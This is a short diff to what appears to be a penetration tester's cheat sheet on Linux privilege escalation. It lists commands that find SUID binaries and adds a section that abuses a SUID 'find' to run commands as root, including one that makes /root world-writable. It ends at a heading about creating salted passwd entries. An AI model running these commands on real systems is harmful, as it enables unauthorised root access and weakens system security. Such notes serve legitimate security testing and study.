@@ -1,13 +1,16 @@
-## Finding SUID Binaries
+## Finding SUID etc
 ```
 find / -perm -u=s -type f 2>/dev/null
 find / -user root -perm -4000 -exec ls -ldb {} \;
-```
-
-## find bin
-```
 find / -perm +6000 2>/dev/null | grep '/bin/'
 ```
+
+## find has SUID
+```
+find . -exec touch test.txt \;
+find . -exec chmod -R 777 /root \;
+```
+
 
 ## Create Salt Passwd
 ```
